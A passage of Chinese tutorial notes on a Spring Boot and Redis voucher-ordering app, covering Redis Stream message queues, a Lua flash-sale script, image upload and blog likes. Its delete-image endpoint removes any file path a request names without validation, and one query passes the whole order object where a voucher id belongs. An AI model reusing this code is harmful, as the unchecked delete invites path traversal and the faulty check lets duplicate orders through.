                    handleVoucherOrder(voucherOrder);
                } catch (Exception e) {
                    log.error("处理订单异常", e);
                }
            }
        }
    }

    private void handleVoucherOrder(VoucherOrder voucherOrder) {
        // 获取用户，注意不能从线程池中获取
        Long userId = voucherOrder.getUserId();
        // 创建锁对象（实际上不太可能出现并发安全问题）
        RLock lock = redissonClient.getLock("lock:order:" + userId);
        // 获取锁
        boolean isLock = lock.tryLock();
        // 判断是否获取锁成功
        if (!isLock) {
            // 获取锁失败，返回错误或重试
            log.error("不允许重复下单");
            return;
        }
        try {
            proxy.createVoucherOrder(voucherOrder);
        } finally {
            // 释放锁
            lock.unlock();
        }
    }

    private IVoucherOrderService proxy;

    @Override
    public Result seckillVoucher(Long voucherId) {
        // 获取用户
        Long userId = UserHolder.getUser().getId();
        // 执行lua脚本
        Long result = stringRedisTemplate.execute(
                SECKILL_SCRIPT,
                Collections.emptyList(),
                voucherId.toString(), userId.toString()
        );
        // 判断结果是否为0
        int r = result.intValue();
        if (r != 0) {
            // 不为0，代表没有购买资格
            return Result.fail(r == 1 ? "库存不足" : "不能重复下单");
        }
        // 为0，有购买资格，把下单信息保存到阻塞队列
        VoucherOrder voucherOrder = new VoucherOrder();
        long orderId = redisIdWorker.nextId("order");
        voucherOrder.setId(orderId);  // 订单id
        voucherOrder.setUserId(userId);  // 用户id
        voucherOrder.setVoucherId(voucherId);  // 代金券id
        // 放入阻塞队列
        orderTasks.add(voucherOrder);
        // 获取代理对象
        proxy = (IVoucherOrderService) AopContext.currentProxy();
        // 返回订单id
        return Result.ok(orderId);
    }

    @Transactional
    public void createVoucherOrder(VoucherOrder voucherOrder) {
        Long userId = voucherOrder.getUserId();
        // 一人一单：查询订单
        int count = query().eq("user_id", userId).eq("voucher_id", voucherOrder).count();
        // 一人一单：判断是否存在
        if (count > 0) {
            // 用户已经购买过了（不太可能发生）
            log.error("用户已经购买过一次！");
            return;
        }
        // 扣减库存
        boolean success = seckillVoucherService.update()
                .setSql("stock = stock - 1")
                .eq("voucher_id", voucherOrder.getVoucherId())
                .gt("stock", 0)
                .update();
        if (!success) {
            // 扣减失败（不太可能发生）
            log.error("库存不足！");
            return;
        }
        // 创建订单
        save(voucherOrder);
    }

}
```

此时使用JMeter对`/voucher-order/seckill/{id}`接口进行高并发测试，吞吐量与响应时间要更好。

基于阻塞队列的异步秒杀存在的问题：

- 内存限制问题。JDK的`BlockingQueue`使用的是JVM的内存，在高并发情况下可能出现内存溢出，因此需要设置队列长度，如果队列已满，则无法再存放数据。
- 数据安全问题。订单信息保存在内存中，如果服务宕机，则订单信息全部丢失；线程从队列取出订单任务准备执行，此时发生严重事故导致任务没有执行，造成任务丢失。

### Redis消息队列实现异步秒杀

**消息队列（Message Queue）**，字面意思就是存放消息的队列。最简单的消息队列模型包括3个角色：

- 消息队列：存储和管理消息，也被称为消息代理（Message Broker）。
- 生产者：发送消息到消息队列。
- 消费者：从消息队列获取消息并处理消息。

在本例中，当有人抢购商品时，要判断秒杀时间和库存$\rightarrow$校验一人一单$\rightarrow$发送优惠券id和用户id到消息队列（生产者）；同时开启一个独立线程，接收消息、完成下单（消费者）。

消息队列与之前使用的阻塞队列有两个不同：

- 消息是JVM以外的独立服务，不受JVM内存的限制。
- 消息队列不仅存储数据，还要确保数据安全（存进消息队列的所有消息都要持久化）。而且消息投递给消费者后，要求消费者确认消息，如果消息没有确认，则消息仍然在队列中，下一次会再次投递给消费者处理，直到成功为止，也就是确保消息至少被消费一次。

Redis提供了三种不同的方式来实现消息队列：

- `List`结构：基于`List`结构模拟消息队列。
- PubSub：基本的点对点消息模型。
- `Stream`：比较完善的消息队列模型。

当然也可以使用RabbitMQ等队列，这些消息队列更加专业、功能更完善，但是需要额外学习并搭建服务，有一定成本。

#### 基于`List`结构模拟消息队列

Redis的`List`数据结构是一个双向链表，很容易模拟出队列效果。

队列是入口和出口不在一边，因此可以利用：`LPUSH`结合`RPOP`、或者`RPUSH`结合`LPOP`来实现。

不过要注意的是，当队列中没有消息时`RPOP`或`LPOP`操作会返回`null`，并不像JVM的阻塞队列那样会阻塞并等待消息。因此这里应该使用`BRPOP`或者`BLPOP`来实现阻塞效果。

基于`List`的消息队列的优缺点如下：

- 优点：

  - 利用Redis存储，不受限于JVM内存上限。

  - 基于Redis的持久化机制，数据安全性有保证。

  - 可以满足消息有序性。

- 缺点：

  - 无法避免消息丢失。

  - 只支持单消费者（一旦消息被一个消费者取走，其他消费者无法再获取该消息）。

#### 基于PubSub的消息队列

**PubSub（发布订阅）**是Redis2.0版本引入的消息传递模型。顾名思义，消费者可以订阅一个或多个频道（channel），生产者向对应频道发送消息后，所有订阅者都能收到相关消息。相关命令包括：

- `SUBSCRIBE channel [channel]`：订阅一个或多个频道。
- `PUBLISH channel msg`：向一个频道发送消息。
- `PSUBSCRIBE pattern[pattern]`：订阅与`pattern`格式匹配的所有频道。

```sh
publish order.queue msg1  # 生产者发送消息
subscribe order.queue  # 消费者1
psubscribe order.*  # 消费者2
```

基于PubSub的消息队列的优缺点如下：

- 优点：
  - 采用发布订阅模型，支持多生产、多消费。

- 缺点：

  - 不支持数据持久化，如果频道没有被任何人订阅则直接丢失。

  - 无法避免消息丢失。

  - 消息堆积有上限，超出时数据丢失（消费者的缓存区有限）。

#### 基于`Stream`的消息队列

##### 单消费模式

[`Stream`](https://redis.io/docs/manual/data-types/streams/)是Redis 5.0 引入的一种新数据类型，可以实现一个功能非常完善的消息队列。

发送消息的命令为`XADD`，参数的含义如下：

- `key`：队列名称。

- `[NOMKSTREAM]`：可选，如果队列不存在，是否自动创建队列，默认是自动创建。
- `[MAXLEN|MINID [=|-] threshold [LIMIT count]`：可选，设置消息队列的最大消息数量（如果消息数量超过该值，这些消息一直没有消费者处理，则一些旧消息会被移除）。
- `*|ID`：消息的唯一id，`*`代表由Redis自动生成。格式是`"时间戳-递增数字"`，例如`"1644804662707-0"`。
- `field value [field value ...]`：发送到队列中的消息，称为Entry。格式就是多个键值对。

最简单的使用如下：

```sh
# 创建名为users的队列，并向其中发送一个消息，内容是：{name=jack, age=21}，并且使用Redis自动生成ID
XADD users * name jack age 21
XLEN users  # 查看队列中消息数量
```

读取消息的命令为`XREAD`，参数的含义如下：

- `[COUNT count]`：每次读取消息的最大数量。
- `[BLOCK milliseconds]`：当没有消息时，是否阻塞、阻塞时长（如果为0，则永久等待）。
- `STREAMS key [key ...]`：要从哪个队列读取消息，`key`就是队列名。
- `ID [ID ...]`：起始id，只返回大于该ID的消息。`0`：代表从第一个消息开始。`$`：代表从最新的消息开始。

使用`XREAD`读取第一个消息：

```sh
XREAD COUNT 1 STREAMS users 0
```

`XREAD`阻塞方式，读取最新的消息：

```sh
XREAD COUNT 1 BLOCK 1000 STREAMS users $
```


在业务开发中，我们可以循环的调用`XREAD`阻塞方式来查询最新消息，从而实现持续监听队列的效果，伪代码如下：

```java
while (true) {
    // 尝试读取队列中的消息，最多阻塞1秒
    Object msg = redis.execute("XREAD COUNT 1 BLOCK 1000 STREAMS users $");
    if (msg == null) {
        continue;
    }
    // 处理消息
    handleMessage(msg);
}
```

当我们指定起始ID为`$`时，代表读取最新的消息，如果我们处理一条消息的过程中，又有超过1条以上的消息到达队列，则下次获取时也只能获取到最新的一条，会出现漏读消息的问题。

STREAM类型消息队列的`XREAD`命令特点：

- 消息可回溯（消息读完不消失，永久保存在队列中）。
- 一个消息可以被多个消费者读取。
- 可以阻塞读取。
- 有消息漏读的风险。

##### 消费者组

**消费者组（Consumer Group）**：将多个消费者划分到一个组中，监听同一个队列。具备下列特点：

- 消息分流：队列中的消息会分流给组内的不同消费者，而不是重复消费，从而加快消息处理的速度。
- 消息标识：消费者组会维护一个标识，记录最后一个被处理的消息，哪怕消费者宕机重启，还会从标识之后读取消息。确保每一个消息都会被消费。
- 消息确认：消费者获取消息后，消息处于pending状态，并存入一个pending-list。当处理完成后需要通过`XACK`来确认消息，标记消息为已处理，才会从pending-list移除。

创建消费者组的命令为`XGROUP CREATE`，参数的含义如下：

- `key`：队列名称。
- `groupName`：消费者组名称。
- `ID`：（监听消息的）起始ID标识，`$`代表队列中最后一个消息（队列创建那一刻开始最新的消息），`0`则代表队列中第一个消息。
- `[MKSTREAM]`：队列不存在时自动创建队列与组。

其它常见命令：

- 删除指定的消费者组：`XGROUP DESTORY key groupName`。

- 给指定的消费者组添加消费者：`XGROUP CREATECONSUMER key groupname consumername`。

- 删除消费者组中的指定消费者：`XGROUP DELCONSUMER key groupname consumername`。

从消费者组读取消息的命令为`XREADGROUP`，参数的含义如下：

- `GROUP group`：消费组名称。
- `consumer`：消费者名称，如果消费者不存在，会自动创建一个消费者。
- `[COUNT count]`：本次查询的最大数量。
- `[BLOCK milliseconds]`：当没有消息时最长等待时间。
- `[NOACK]`：无需手动ACK，获取到消息后自动确认。也就是消息不会进入pending-list。
- `STREAMS key [key ...]`：指定队列名称。
- `ID [ID ...]`：获取消息的起始ID。
  - `>`：从下一个未消费的消息开始。
  - 其它：根据指定id从pending-list中获取已消费但未确认的消息，例如`0`，是从pending-list中的第一个消息开始。

确认消息的命令为`XACK`，参数的含义如下：

- `key`：队列名称。
- `group`：组名称。
- `ID [ID ...]`：要确认的消息的ID。

如果消息未被确认，则可以通过`XPENDING`命令查看pending-list，参数含义如下：

- `key`：队列名称。
- `group`：组名称。
- `[IDLE min-idle-time]`：空闲时间（获取消息后、确认消息之前的这段时间）。只有超过空闲时间的消息才会返回。
- `start end`：消息的ID范围。`-`表示无穷小，`+`表示无穷大。
- `count`：消息数量。
- `[consumer]`：pending-list的消费者。

消费者监听消息的基本思路：

```java
while (true) {
    // 尝试监听队列，使用阻塞模式，最长等待时间2000毫秒
    Object msg = redis.call('XREADGROUP GROUP g1 c1 COUNT 1 BLOCK 2000 STREAMS s1 >');
    if (msg == null) {  // 没有消息，继续下一次
        continue;
    }
    try {
        // 处理消息，完成后一定要ACK
        handleMessage(msg);
    } catch (Exception e) {
        while (true) {
            Object msg = redis.call("XREADGROUP GROUP g1 c1 COUNT 1 STREAMS s1 0");
            if (msg == null) {  // 没有异常消息，所有消息都已确认，结束循环
                break;
            }
            try {
                // 有异常消息，再次处理
                handleMessage(msg);
            } catch (Exception e) {
                // 再次出现异常，记录日志，继续循环
                continue;
            }
        }
    }
}
```

`STREAM`类型消息队列的`XREADGROUP`命令特点：

- 消息可回溯。
- 可以多消费者争抢消息，加快消费速度。
- 可以阻塞读取。
- 没有消息漏读的风险。
- 有消息确认机制，保证消息至少被消费一次。

3种消息队列的总结如下：

|              | `List`                                   | PubSub             | `Stream`                                               |
| ------------ | ---------------------------------------- | ------------------ | ------------------------------------------------------ |
| 消息持久化   | 支持                                     | 不支持             | 支持                                                   |
| 阻塞读取     | 支持                                     | 支持               | 支持                                                   |
| 消息堆积处理 | 受限于内存空间，可以利用多消费者加快处理 | 受限于消费者缓冲区 | 受限于队列长度，可以利用消费者组提高消费速度，减少堆积 |
| 消息确认机制 | 不支持                                   | 不支持             | 支持                                                   |
| 消息回溯     | 不支持                                   | 不支持             | 支持                                                   |

下面基于Redis的`Stream`结构作为消息队列，实现异步秒杀下单，需求：

- 创建一个`Stream`类型的消息队列，名为`stream.orders`。
- 修改之前的秒杀下单Lua脚本，在认定有抢购资格后，直接向`stream.orders`中添加消息，内容包含`voucherId`、`userId`、`orderId`。
- 项目启动时，开启一个线程任务，尝试获取`stream.orders`中的消息，完成下单。

创建消费者组的方式如下：

```sh
XGROUP CREATE stream.orders g1 0 MKSTREAM
```

修改seckill.lua：

```lua
-- 优惠券id
local voucherId = ARGV[1]
-- 用户id
local userId = ARGV[2]
-- 订单id
local orderId = ARGV[3]

-- 库存键
local stockKey = 'seckill:stock:' .. voucherId
-- 订单键
local orderKey = 'seckill:order:' .. voucherId

-- 判断库存是否充足
if (tonumber(redis.call('get', stockKey)) <= 0) then
    -- 库存不足，返回1
    return 1
end
-- 判断用户是否下单
if (redis.call('sismember', orderKey, userId) == 1) then
    -- 存在，说明是重复下单，返回2
    return 2
end
-- 扣库存
redis.call('incrby', stockKey, -1)
-- 下单（保存用户）
redis.call('sadd', orderKey, userId)
-- 发送消息到队列中
redis.call('xadd', 'stream.orders', '*', 'userId', userId, 'voucherId', voucherId, 'id', orderId)  -- orderId的键为id，与VoucherOrder实体类保持一致
return 0
```

修改`VoucherOrderServiceImpl`：

```java
package com.hmdp.service.impl;

import cn.hutool.core.bean.BeanUtil;
import com.hmdp.dto.Result;
import com.hmdp.entity.VoucherOrder;
import com.hmdp.mapper.VoucherOrderMapper;
import com.hmdp.service.ISeckillVoucherService;
import com.hmdp.service.IVoucherOrderService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.hmdp.utils.RedisIdWorker;
import com.hmdp.utils.UserHolder;
import lombok.extern.slf4j.Slf4j;
import org.redisson.api.RLock;
import org.redisson.api.RedissonClient;
import org.springframework.aop.framework.AopContext;
import org.springframework.core.io.ClassPathResource;
import org.springframework.data.redis.connection.stream.*;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.data.redis.core.script.DefaultRedisScript;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import javax.annotation.PostConstruct;
import javax.annotation.Resource;
import java.time.Duration;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.concurrent.*;

@Slf4j
@Service
public class VoucherOrderServiceImpl extends ServiceImpl<VoucherOrderMapper, VoucherOrder> implements IVoucherOrderService {

    @Resource
    private ISeckillVoucherService seckillVoucherService;

    @Resource
    private RedisIdWorker redisIdWorker;

    @Resource
    private StringRedisTemplate stringRedisTemplate;


    @Resource
    private RedissonClient redissonClient;

    private static final DefaultRedisScript<Long> SECKILL_SCRIPT;

    static {
        SECKILL_SCRIPT = new DefaultRedisScript<>();
        SECKILL_SCRIPT.setLocation(new ClassPathResource("seckill.lua"));
        SECKILL_SCRIPT.setResultType(Long.class);
    }

    private static final ExecutorService SECKILL_ORDER_EXECUTOR = Executors.newSingleThreadExecutor();  // 处理订单不要求速度快

    @PostConstruct
    private void init() {
        SECKILL_ORDER_EXECUTOR.submit(new VoucherOrderHandler());
    }

    private class VoucherOrderHandler implements Runnable {
        String queueName = "stream.orders";
        @Override
        public void run() {
            while (true) {
                try {
                    // 获取消息队列中的订单信息
                    List<MapRecord<String, Object, Object>> list = stringRedisTemplate.opsForStream().read(
                            Consumer.from("g1", "c1"),  // GROUP
                            StreamReadOptions.empty().count(1).block(Duration.ofSeconds(2)),  // COUNT、BLOCK
                            StreamOffset.create(queueName, ReadOffset.lastConsumed())  // ID：>
                    );
                    // 判断消息获取是否成功
                    if (list == null || list.isEmpty()) {
                        // 如果获取失败，说明没有消息，继续下一次循环
                        continue;
                    }
                    // 解析消息中的订单信息
                    MapRecord<String, Object, Object> record = list.get(0);// 消息队列中一定只有一条消息
                    Map<Object, Object> values = record.getValue();
                    VoucherOrder voucherOrder = BeanUtil.fillBeanWithMap(values, new VoucherOrder(), true);
                    // 如果获取成功，可以下单
                    handleVoucherOrder(voucherOrder);
                    // ACK确认
                    stringRedisTemplate.opsForStream().acknowledge(queueName, "g1", record.getId());
                } catch (Exception e) {
                    log.error("处理订单异常", e);
                    handlePendingList();
                }
            }
        }

        private void handlePendingList() {
            while (true) {
                try {
                    // 获取pending-list中的订单信息
                    List<MapRecord<String, Object, Object>> list = stringRedisTemplate.opsForStream().read(
                            Consumer.from("g1", "c1"),  // GROUP
                            StreamReadOptions.empty().count(1),  // COUNT、BLOCK
                            StreamOffset.create(queueName, ReadOffset.from("0"))  // ID：0
                    );
                    // 判断消息获取是否成功
                    if (list == null || list.isEmpty()) {
                        // 如果获取失败，说明pending-list没有异常消息，结束循环
                        break;
                    }
                    // 解析消息中的订单信息
                    MapRecord<String, Object, Object> record = list.get(0);// 消息队列中一定只有一条消息
                    Map<Object, Object> values = record.getValue();
                    VoucherOrder voucherOrder = BeanUtil.fillBeanWithMap(values, new VoucherOrder(), true);
                    // 如果获取成功，可以下单
                    handleVoucherOrder(voucherOrder);
                    // ACK确认
                    stringRedisTemplate.opsForStream().acknowledge(queueName, "g1", record.getId());
                } catch (Exception e) {
                    log.error("处理pending-list订单异常", e);
                    try {
                        Thread.sleep(20);
                    } catch (InterruptedException interruptedException) {
                        interruptedException.printStackTrace();
                    }
                }
            }
        }
    }

    private void handleVoucherOrder(VoucherOrder voucherOrder) {
        // 获取用户，注意不能从线程池中获取
        Long userId = voucherOrder.getUserId();
        // 创建锁对象（实际上不太可能出现并发安全问题）
        RLock lock = redissonClient.getLock("lock:order:" + userId);
        // 获取锁
        boolean isLock = lock.tryLock();
        // 判断是否获取锁成功
        if (!isLock) {
            // 获取锁失败，返回错误或重试
            log.error("不允许重复下单");
            return;
        }
        try {
            proxy.createVoucherOrder(voucherOrder);
        } finally {
            // 释放锁
            lock.unlock();
        }
    }

    private IVoucherOrderService proxy;

    @Override
    public Result seckillVoucher(Long voucherId) {
        // 获取用户
        Long userId = UserHolder.getUser().getId();
        // 获取订单id
        long orderId = redisIdWorker.nextId("order");
        // 执行lua脚本
        Long result = stringRedisTemplate.execute(
                SECKILL_SCRIPT,
                Collections.emptyList(),
                voucherId.toString(), userId.toString(), String.valueOf(orderId)
        );
        // 判断结果是否为0
        int r = result.intValue();
        if (r != 0) {
            // 不为0，代表没有购买资格
            return Result.fail(r == 1 ? "库存不足" : "不能重复下单");
        }
        // 获取代理对象
        proxy = (IVoucherOrderService) AopContext.currentProxy();
        // 返回订单id
        return Result.ok(orderId);
    }

    @Transactional
    public void createVoucherOrder(VoucherOrder voucherOrder) {
        Long userId = voucherOrder.getUserId();
        // 一人一单：查询订单
        int count = query().eq("user_id", userId).eq("voucher_id", voucherOrder).count();
        // 一人一单：判断是否存在
        if (count > 0) {
            // 用户已经购买过了（不太可能发生）
            log.error("用户已经购买过一次！");
            return;
        }
        // 扣减库存
        boolean success = seckillVoucherService.update()
                .setSql("stock = stock - 1")
                .eq("voucher_id", voucherOrder.getVoucherId())
                .gt("stock", 0)
                .update();
        if (!success) {
            // 扣减失败（不太可能发生）
            log.error("库存不足！");
            return;
        }
        // 创建订单
        save(voucherOrder);
    }

}
```


## 达人探店

### 发布探店笔记

探店笔记类似点评网站的评价，往往是图文结合。对应的表有两个：

- tb_blog：探店笔记表，包含笔记中的标题、文字、图片等。
- tb_blog_comments：其他用户对探店笔记的评价。

创建`UploadController`，用于文件上传：

```java
package com.hmdp.controller;

import cn.hutool.core.io.FileUtil;
import cn.hutool.core.util.StrUtil;
import com.hmdp.dto.Result;
import com.hmdp.utils.SystemConstants;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.IOException;
import java.util.UUID;

@Slf4j
@RestController
@RequestMapping("upload")
public class UploadController {

    @PostMapping("blog")
    public Result uploadImage(@RequestParam("file") MultipartFile image) {
        try {
            // 获取原始文件名称
            String originalFilename = image.getOriginalFilename();
            // 生成新文件名
            String fileName = createNewFileName(originalFilename);
            // 保存文件
            image.transferTo(new File(SystemConstants.IMAGE_UPLOAD_DIR, fileName));
            // 返回结果
            log.debug("文件上传成功，{}", fileName);
            return Result.ok(fileName);
        } catch (IOException e) {
            throw new RuntimeException("文件上传失败", e);
        }
    }

    @GetMapping("/blog/delete")
    public Result deleteBlogImg(@RequestParam("name") String filename) {
        File file = new File(SystemConstants.IMAGE_UPLOAD_DIR, filename);
        if (file.isDirectory()) {
            return Result.fail("错误的文件名称");
        }
        FileUtil.del(file);
        return Result.ok();
    }

    private String createNewFileName(String originalFilename) {
        // 获取后缀
        String suffix = StrUtil.subAfter(originalFilename, ".", true);
        // 生成目录
        String name = UUID.randomUUID().toString();
        int hash = name.hashCode();
        int d1 = hash & 0xF;
        int d2 = (hash >> 4) & 0xF;
        // 判断目录是否存在
        File dir = new File(SystemConstants.IMAGE_UPLOAD_DIR, StrUtil.format("/blogs/{}/{}", d1, d2));
        if (!dir.exists()) {
            dir.mkdirs();
        }
        // 生成文件名
        return StrUtil.format("/blogs/{}/{}/{}.{}", d1, d2, name, suffix);
    }
}
```

发布笔记功能功能如下：

```java
package com.hmdp.controller;


import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.hmdp.dto.Result;
import com.hmdp.dto.UserDTO;
import com.hmdp.entity.Blog;
import com.hmdp.service.IBlogService;
import com.hmdp.utils.SystemConstants;
import com.hmdp.utils.UserHolder;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;
import java.util.List;

@RestController
@RequestMapping("/blog")
public class BlogController {

    @Resource
    private IBlogService blogService;

    @PostMapping
    public Result saveBlog(@RequestBody Blog blog) {
        // 获取登录用户
        UserDTO user = UserHolder.getUser();
        blog.setUserId(user.getId());
        // 保存探店笔记
        blogService.save(blog);
        // 返回id
        return Result.ok(blog.getId());
    }

    @PutMapping("/like/{id}")
    public Result likeBlog(@PathVariable("id") Long id) {
        // 修改点赞数量
        blogService.update()
                .setSql("liked = liked + 1").eq("id", id).update();
        return Result.ok();
    }

    @GetMapping("/of/me")
    public Result queryMyBlog(@RequestParam(value = "current", defaultValue = "1") Integer current) {
        // 获取登录用户
        UserDTO user = UserHolder.getUser();
        // 根据用户查询
        Page<Blog> page = blogService.query()
                .eq("user_id", user.getId()).page(new Page<>(current, SystemConstants.MAX_PAGE_SIZE));
        // 获取当前页数据
        List<Blog> records = page.getRecords();
        return Result.ok(records);
    }
}
```

其中`Blog`类的定义如下：

```java
package com.hmdp.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;
import java.time.LocalDateTime;

@Data
@EqualsAndHashCode(callSuper = false)
@Accessors(chain = true)
@TableName("tb_blog")
public class Blog implements Serializable {

    private static final long serialVersionUID = 1L;

    /**
     * 主键
     */
    @TableId(value = "id", type = IdType.AUTO)
    private Long id;
    /**
     * 商户id
     */
    private Long shopId;
    /**
     * 用户id
     */
    private Long userId;
    /**
     * 用户图标
     */
    @TableField(exist = false)
    private String icon;
    /**
     * 用户姓名
     */
    @TableField(exist = false)
    private String name;

    /**
     * 标题
     */
    private String title;

    /**
     * 探店的照片，最多9张，多张以","隔开
     */
    private String images;

    /**
     * 探店的文字描述
     */
    private String content;

    /**
     * 点赞数量
     */
    private Integer liked;

    /**
     * 评论数量
     */
    private Integer comments;

    /**
     * 创建时间
     */
    private LocalDateTime createTime;

    /**
     * 更新时间
     */
    private LocalDateTime updateTime;


}
```

`IBlogService`类的定义如下：

```java
package com.hmdp.service;

import com.hmdp.entity.Blog;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IBlogService extends IService<Blog> {}
```

```java
package com.hmdp.service.impl;

import com.hmdp.entity.Blog;
import com.hmdp.mapper.BlogMapper;
import com.hmdp.service.IBlogService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import org.springframework.stereotype.Service;

@Service
public class BlogServiceImpl extends ServiceImpl<BlogMapper, Blog> implements IBlogService {}
```

`BlogMapper`的定义如下：

```java
package com.hmdp.mapper;

import com.hmdp.entity.Blog;
import com.baomidou.mybatisplus.core.mapper.BaseMapper;

public interface BlogMapper extends BaseMapper<Blog> {}
```

点击首页最下方菜单栏中的+按钮，即可发布探店图文。注意上传照片与发布笔记是分离的功能。上传照片成功后返回照片地址，然后会作为表单参数在发布笔记时一起提交到后台。

#### 查看发布探店笔记

需求：点击首页的探店笔记，会进入详情页面，实现该页面的查询接口。

该接口的返回值是笔记信息，包括用户信息。因此可以在`Blog`内中设置成员变量`User`，这里使用`@TableField(exist = false)`标记`icon`与`name`，它与`userId`一起组成用户信息。

在`BlogController`中添加两个方法：

```java
@GetMapping("/hot")
public Result queryHotBlog(@RequestParam(value = "current", defaultValue = "1") Integer current) {
    return blogService.queryHotBlog(current);
}

@GetMapping("/{id}")
public Result queryBlogById(@PathVariable("id") Long id) {
    return blogService.queryBlogById(id);
}
```

修改服务类：

```java
import com.hmdp.dto.Result;

public interface IBlogService extends IService<Blog> {

    Result queryHotBlog(Integer current);

    Result queryBlogById(Long id);
}
```

```java
package com.hmdp.service.impl;

import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.hmdp.dto.Result;
import com.hmdp.entity.Blog;
import com.hmdp.entity.User;
import com.hmdp.mapper.BlogMapper;
import com.hmdp.service.IBlogService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.hmdp.service.IUserService;
import com.hmdp.utils.SystemConstants;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import java.util.List;

@Service
public class BlogServiceImpl extends ServiceImpl<BlogMapper, Blog> implements IBlogService {

    @Resource
    private IUserService userService;

    @Override
    public Result queryHotBlog(Integer current) {
        // 根据用户查询
        Page<Blog> page = query()
                .orderByDesc("liked")
                .page(new Page<>(current, SystemConstants.MAX_PAGE_SIZE));
        // 获取当前页数据
        List<Blog> records = page.getRecords();
        // 查询用户
        records.forEach(this::queryBlogUser);
        return Result.ok(records);
    }

    @Override
    public Result queryBlogById(Long id) {
        // 查询blog
        Blog blog = getById(id);
        if (blog == null) {
            return Result.fail("笔记不存在");
        }
        // 查询blog有关的用户
        queryBlogUser(blog);
        return Result.ok(blog);
    }

    private void queryBlogUser(Blog blog) {
        Long userId = blog.getUserId();
        User user = userService.getById(userId);
        blog.setName(user.getNickName());
        blog.setIcon(user.getIcon());
    }

}
```

### 点赞

在首页的探店笔记排行榜和探店图文详情页面都有点赞的功能。这个接口已在`BlogController`的`likeBlog`方法中实现。但是问题在于一个用户对同一篇笔记可以无限次点赞。因此修改需求如下：

需求：

- 同一个用户只能点赞一次，再次点击则取消点赞。
- 如果当前用户已经点赞，则点赞按钮高亮显示（前端已实现，通过判断字段`Blog`类的`isLike`属性）。

实现步骤：

- 给`Blog`类中添加一个`isLike`字段，标识是否被当前用户点赞。
- 修改点赞功能，利用Redis的`set`集合判断是否点赞过，未点赞过则点赞数+1，已点赞过则点赞数-1。
- 修改根据`id`查询`Blog`的业务，判断当前登录用户是否点赞过，赋值给`isLike`字段。
- 修改分页查询`Blog`业务，判断当前登录用户是否点赞过，赋值给`isLike`字段。

给`Blog`类添加一个`isLike`字段：

```java
/**
 * 是否点赞过了
 */
@TableField(exist = false)
private Boolean isLike;
```

修改`BlogController`的`likeBlog`方法：

```java
@PutMapping("/like/{id}")
public Result likeBlog(@PathVariable("id") Long id) {
    // 修改点赞数量
    return blogService.likeBlog(id);
}
```

在`IBlogService`中添加方法：

```java
Result likeBlog(Long id);
```

对应的实现类：

```java
import com.hmdp.utils.UserHolder;
import org.springframework.data.redis.core.StringRedisTemplate;
import static com.hmdp.utils.RedisConstants.BLOG_LIKED_KEY;
import cn.hutool.core.util.BooleanUtil;

@Resource
private StringRedisTemplate stringRedisTemplate;

@Override
public Result likeBlog(Long id) {
    // 获取登录用户
    Long userId = UserHolder.getUser().getId();
    // 判断当前登录用户是否已经点赞
    String key = BLOG_LIKED_KEY + id;
    Boolean isMember = stringRedisTemplate.opsForSet().isMember(key, userId.toString());
    if (BooleanUtil.isFalse(isMember)) {
        // 如果未点赞，可以点赞
        // 数据库点赞数 + 1
        boolean isSuccess = update().setSql("liked = liked + 1").eq("id", id).update();
        // 保存用户到Redis的set集合
        if (isSuccess) {
            stringRedisTemplate.opsForSet().add(key, userId.toString());
        }
    } else {
        // 如果已点赞，取消点赞
        // 数据库点赞数 - 1
        boolean isSuccess = update().setSql("liked = liked - 1").eq("id", id).update();
        // 把用户从Redis的set集合移除
        if (isSuccess) {
            stringRedisTemplate.opsForSet().remove(key, userId.toString());
        }
    }
    return Result.ok();
}
```

另外，在`queryHotBlog`与`queryBlogById`方法中，查询用户是否点赞并设置：

```java
@Override
public Result queryHotBlog(Integer current) {
    // 根据用户查询
    Page<Blog> page = query()
        .orderByDesc("liked")
        .page(new Page<>(current, SystemConstants.MAX_PAGE_SIZE));
    // 获取当前页数据
    List<Blog> records = page.getRecords();
    // 查询用户
    records.forEach(blog -> {
        queryBlogUser(blog);
        isBlogLiked(blog);
    });
    return Result.ok(records);
}

@Override
public Result queryBlogById(Long id) {
    // 查询blog
    Blog blog = getById(id);
    if (blog == null) {
        return Result.fail("笔记不存在");
    }
    // 查询blog有关的用户
    queryBlogUser(blog);
    // 查询blog是否被点赞
    isBlogLiked(blog);
    return Result.ok(blog);
}

private void isBlogLiked(Blog blog) {
    // 获取登录用户
    Long userId = UserHolder.getUser().getId();
    // 判断当前登录用户是否已经点赞
    String key = BLOG_LIKED_KEY + blog.getId();
    Boolean isMember = stringRedisTemplate.opsForSet().isMember(key, userId.toString());
    blog.setIsLike(BooleanUtil.isTrue(isMember));
}
```

### 点赞排行榜

在探店笔记的详情页面，应该把给该笔记点赞的人显示出来，比如最早点赞的TOP5，形成点赞排行榜。

下面实现查询点赞排行榜的接口，需求：

- 按照点赞时间先后排序，返回Top5的用户。

Redis中，三种集合的特点如下：

|          | `List`               | `Set`        | `SortedSet`       |
| -------- | -------------------- | ------------ | ----------------- |
| 排序方式 | 按添加顺序排序       | 无法排序     | 根据`score`值排序 |
| 唯一性   | 不唯一               | 唯一         | 唯一              |
| 查找方式 | 按索引查找或首尾查找 | 根据元素查找 | 根据元素查找      |

由于要支持根据时间排序，且要保证集合中元素的唯一性，同时支持快速查询用户，因此这里基于`SortedSet`实现业务。`SortedSet`未提供`ismember`接口，这里使用`zscore`代替（如果没有用户，返回的分数为`nil`）。

修改点赞逻辑，使用`SortedSet`代替之前的`Set`：

```java
import com.hmdp.dto.UserDTO;

private void isBlogLiked(Blog blog) {
